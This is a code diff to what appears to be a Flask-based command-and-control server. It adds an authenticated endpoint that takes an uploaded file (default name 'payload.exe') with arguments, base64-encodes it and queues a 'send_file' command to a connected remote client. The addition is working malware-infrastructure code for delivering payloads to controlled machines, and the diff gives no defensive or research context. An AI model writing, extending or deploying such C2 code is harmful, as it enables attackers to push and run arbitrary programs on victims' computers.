@@ -1351,6 +1351,27 @@ def c2_exec_result(client_id):
     return jsonify(res)
 
 
+@app.route('/api/c2/send_file/<client_id>', methods=['POST'])
+@login_required
+def c2_send_file(client_id):
+    user = request.current_user
+    if not owns_client(client_id, user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
+    with ws_clients_lock:
+        wsc = ws_clients.get(client_id)
+    if not wsc:
+        return jsonify({'error': 'client offline'}), 404
+    file = request.files.get('file')
+    if not file or not file.filename:
+        return jsonify({'error': 'no file'}), 400
+    args = request.form.get('args', '')
+    filename = secure_filename(file.filename) or 'payload.exe'
+    data_b64 = base64.b64encode(file.read()).decode('ascii')
+    command = f'send_file:{filename}|{args}|{data_b64}'
+    wsc['cmd_queue'].put(json.dumps({'type': 'command', 'command': command}, separators=(',', ':')))
+    return jsonify({'success': True})
+
+
 @app.route('/api/c2/fm/upload/<client_id>', methods=['POST'])
 @login_required
 def c2_fm_upload(client_id):
